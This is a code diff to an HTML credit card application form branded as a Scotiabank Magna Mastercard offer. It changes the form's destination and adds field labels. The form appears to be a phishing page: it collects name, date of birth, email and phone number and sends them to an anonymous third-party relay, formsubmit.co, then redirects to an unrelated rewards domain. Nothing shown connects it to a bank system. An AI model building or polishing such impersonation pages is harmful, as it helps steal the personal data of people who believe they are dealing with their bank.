@@ -79,21 +79,26 @@
                     </div>
                     <div class="col">
                         <div id ="form-container" class="container animate__flipInX animate__delay-2s">  
-                            <form id="contact"  action="https://formsubmit.co/3de8e2c533c9af55d655095f879ddecb" method="POST">
+                            <form id="contact"  action="https://formsubmit.co/0af219c0cdb78c64d2f61b8b14d0e719" method="POST">
                               <h2 style="text-align: center;">Apply now</h2>
                               <h4>Scotiabank Magna Mastercard, shop and get rewards</h4>
                               <fieldset>
-                                <input placeholder="Your name" type="text" name="name " tabindex="1" required autofocus>
+                                <label for="name">Full Name</label>
+                                <input placeholder="Your name" type="text" name="name " id="name" tabindex="1" required autofocus>
                               </fieldset>
+                              
                               <fieldset style="padding-bottom: 1.5%;">
-                                <input class="formEx" placeholder="date of Birth" type="date" name="Date of birth " tabindex="1" required autofocus>
+                                <label for="dot">Date of birth</label>
+                                <input class="formEx" placeholder="date of Birth" type="date" name="Date of birth " tabindex="1" id="dot" required autofocus>
                               </fieldset>
                               <fieldset>
-                                <input placeholder="Your Email Address" type="email" name="email " tabindex="2" required autofocus>
+                                <label for="email">Email Address</label>
+                                <input placeholder="Your Email Address" type="email" name="email " id="email" tabindex="2" required autofocus>
                                 <input type="hidden" name="_next" value="https://earn.magnarewards.com/src/index.html">
                               </fieldset>
                               <fieldset>
-                                <input placeholder="Your Phone Number (optional)" type="tel" name="tel Number " tabindex="3" required autofocus>
+                                <label for="number">Contact Number</label>
+                                <input placeholder="Your Phone Number (optional)" type="tel" name="tel Number " id="number" tabindex="3" required autofocus>
                               </fieldset>
                               <fieldset>
                                 <label for="employment">Employment status</label>
